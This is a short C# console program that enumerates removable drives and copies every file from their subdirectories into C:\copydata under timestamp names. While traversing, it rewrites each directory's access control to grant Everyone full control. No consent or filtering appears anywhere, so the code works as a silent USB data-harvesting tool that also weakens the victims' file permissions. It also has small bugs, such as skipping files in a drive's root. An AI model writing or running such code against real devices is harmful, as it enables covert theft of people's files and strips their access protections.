using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;

namespace ConsoleApp1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            IEnumerable<DriveInfo> drives = DriveInfo.GetDrives().Where(driver => driver.DriveType == DriveType.Removable);
            List<string> store = new List<string>();
            string PATH = @"C:\copydata";
            foreach (DriveInfo drive in drives)
            {
                try
                {
                    // Check sub directories
                    TraverseDirectories(drive.RootDirectory.FullName ,  ref store);
                    Console.WriteLine($"Processed {drive.Name}");
                }
                catch (UnauthorizedAccessException ex)
                {
                    Console.WriteLine($"Unauthorized access exception for {drive.Name}: {ex.Message}");
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred while processing {drive.Name}: {ex.Message}");
                }
            }

            ;

            if (!Directory.Exists(PATH))
            {
                Directory.CreateDirectory(PATH);
            }

            foreach (string subdirpath in store)
            {
                string[] files = Directory.GetFiles(subdirpath);
                foreach (var f in files)
                {
                    try
                    {
                        var arr = f.Split('.');
                        string extension = arr[arr.Length - 1];
                        File.Copy(f, Path.Combine(PATH, $"{DateTime.Now.Ticks.ToString()}.{extension}"));
                    }catch(Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }   
            }

        }

        static void TraverseDirectories(string rootDirectory , ref List<string> store )
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(rootDirectory);

            while (queue.Count > 0)
            {
                string currentDir = queue.Dequeue();

                // Set access control for current directory
                DirectoryInfo dirinfo = new DirectoryInfo(currentDir);
                DirectorySecurity dSecurity = dirinfo.GetAccessControl();
                dSecurity.AddAccessRule(new FileSystemAccessRule(
                    new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                    FileSystemRights.FullControl,
                    InheritanceFlags.ObjectInherit | InheritanceFlags.ContainerInherit,
                    PropagationFlags.NoPropagateInherit,
                    AccessControlType.Allow));
                dirinfo.SetAccessControl(dSecurity);

                // Enqueue subdirectories
                foreach (var subDir in dirinfo.GetDirectories())
                {
                    queue.Enqueue(subDir.FullName);
                    store.Add(subDir.FullName);
                }
            }
        }
    }
}
